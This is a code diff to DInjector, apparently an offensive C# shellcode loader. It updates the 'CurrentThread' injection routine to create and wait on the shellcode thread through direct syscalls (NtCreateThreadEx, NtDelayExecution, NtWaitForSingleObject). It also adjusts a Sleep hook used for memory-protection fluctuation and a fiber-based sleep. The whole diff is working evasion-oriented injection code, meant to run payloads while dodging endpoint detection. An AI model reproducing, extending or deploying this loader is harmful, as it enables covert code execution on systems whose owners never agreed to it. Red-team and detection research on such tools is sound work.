@@ -94,14 +94,27 @@ namespace DInjector
                     strFluctuate = "PAGE_NOACCESS";
 
                 if (fs.EnableHook())
-                    Console.WriteLine($"(CurrentThread) [+] Installed hook for kernel32!Sleep to fluctuate with {strFluctuate}");
+                    Console.WriteLine($"(CurrentThread) [+] Installed hook for KERNEL32$Sleep to fluctuate with {strFluctuate}");
             }
 
             #region NtCreateThreadEx
 
             IntPtr hThread = IntPtr.Zero;
 
-            ntstatus = Syscalls.NtCreateThreadExDelegate(
+            ntstatus = Syscalls.NtCreateThreadEx(
+                ref hThread,
+                DI.Data.Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED,
+                IntPtr.Zero,
+                hProcess,
+                baseAddress,
+                IntPtr.Zero,
+                suspended,
+                0,
+                0,
+                0,
+                IntPtr.Zero);
+
+            /*ntstatus = Syscalls.NtCreateThreadExDelegate(
                 ref hThread,
                 DI.Data.Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED,
                 IntPtr.Zero,
@@ -112,7 +125,7 @@ namespace DInjector
                 0,
                 0,
                 0,
-                IntPtr.Zero);
+                IntPtr.Zero);*/
 
             if (ntstatus == NTSTATUS.Success)
                 Console.WriteLine("(CurrentThread) [+] NtCreateThreadEx");
@@ -123,9 +136,22 @@ namespace DInjector
 
             if (flipSleep > 0)
             {
-                Console.WriteLine($"(CurrentThread) [=] Sleeping for {flipSleep} ms ...");
+                #region NtDelayExecution (flipSleep)
 
-                System.Threading.Thread.Sleep(flipSleep);
+                Console.WriteLine($"(CurrentThread) [=] Delaying execution for {flipSleep} ms before resuming the thread ...");
+
+                Win32.LARGE_INTEGER liFlipSleep = new Win32.LARGE_INTEGER() { QuadPart = (-1) * flipSleep * 10000 };
+
+                ntstatus = Syscalls.NtDelayExecution(
+                    false,
+                    ref liFlipSleep);
+
+                if (ntstatus == NTSTATUS.Success)
+                    Console.WriteLine("(CurrentThread) [+] NtDelayExecution, flipSleep");
+                else
+                    throw new Exception($"(CurrentThread) [-] NtDelayExecution, flipSleep: {ntstatus}");
+
+                #endregion
 
                 #region NtProtectVirtualMemory (protect)
 
@@ -165,7 +191,26 @@ namespace DInjector
 
             if (timeout > 0) // if the shellcode does not need to serve forever, we can do the clean up
             {
-                _ = Win32.WaitForSingleObject(hThread, timeout);
+                #region NtWaitForSingleObject (timeout)
+
+                Console.WriteLine($"(CurrentThread) [=] Waiting for {timeout} ms before cleanup ...");
+
+                // https://github.com/vxunderground/VXUG-Papers/blob/c3bd670c45223baf0af8bfb795d688a104cd0197/Hells%20Gate/C%23%20Implementation/SharpHellsGate/HellsGate.cs#L268-L270
+                Win32.LARGE_INTEGER liTimeout = new Win32.LARGE_INTEGER() { QuadPart = (-1) * timeout * 10000 };
+
+                ntstatus = Syscalls.NtWaitForSingleObject(
+                    hThread,
+                    false,
+                    ref liTimeout);
+
+                if (ntstatus == NTSTATUS.Success)
+                    Console.WriteLine("(CurrentThread) [+] NtWaitForSingleObject|STATUS_SUCCESS, timeout");
+                else if (ntstatus == NTSTATUS.Timeout)
+                    Console.WriteLine("(CurrentThread) [+] NtWaitForSingleObject|STATUS_TIMEOUT, timeout");
+                else
+                    throw new Exception($"(CurrentThread) [-] NtWaitForSingleObject, timeout: {ntstatus}");
+
+                #endregion
 
                 if (oldProtect > 0)
                 {
@@ -211,23 +256,27 @@ namespace DInjector
                 #endregion
             }
 
-            #region NtWaitForSingleObject
+            #region NtWaitForSingleObject (inf)
+
+            Win32.LARGE_INTEGER liInf = new Win32.LARGE_INTEGER() { QuadPart = 0x7FFFFFFFFFFFFFFF };
 
             ntstatus = Syscalls.NtWaitForSingleObject(
                 hThread,
                 false,
-                0);
+                ref liInf);
 
             if (ntstatus == NTSTATUS.Success)
-                Console.WriteLine("(CurrentThread) [+] NtWaitForSingleObject");
+                Console.WriteLine("(CurrentThread) [+] NtWaitForSingleObject|STATUS_SUCCESS, inf");
+            else if (ntstatus == NTSTATUS.Timeout)
+                Console.WriteLine("(CurrentThread) [+] NtWaitForSingleObject|STATUS_TIMEOUT, inf");
             else
-                throw new Exception($"(CurrentThread) [-] NtWaitForSingleObject: {ntstatus}");
+                throw new Exception($"(CurrentThread) [-] NtWaitForSingleObject, inf: {ntstatus}");
 
             #endregion
 
             if (fluctuate != 0)
                 if (fs.DisableHook())
-                    Console.WriteLine($"(CurrentThread) [+] Uninstalled hook for kernel32!Sleep");
+                    Console.WriteLine($"(CurrentThread) [+] Uninstalled hook for KERNEL32$Sleep");
 
             Syscalls.NtClose(hThread);
         }
@@ -323,10 +372,13 @@ namespace DInjector
                 if (mainFiber == IntPtr.Zero)
                     mainFiber = Win32.ConvertThreadToFiber(IntPtr.Zero);
 
-                sleepTime = dwMilliseconds;
-                var sleepFiber = Win32.CreateFiber(0, sleepOrigMethod, IntPtr.Zero);
-                Win32.SwitchToFiber(sleepFiber);
-                Win32.DeleteFiber(sleepFiber);
+                if (mainFiber != IntPtr.Zero)
+                {
+                    sleepTime = dwMilliseconds;
+                    var sleepFiber = Win32.CreateFiber(0, sleepOrigMethod, IntPtr.Zero);
+                    Win32.SwitchToFiber(sleepFiber);
+                    Win32.DeleteFiber(sleepFiber);
+                }
             }
             else
             {
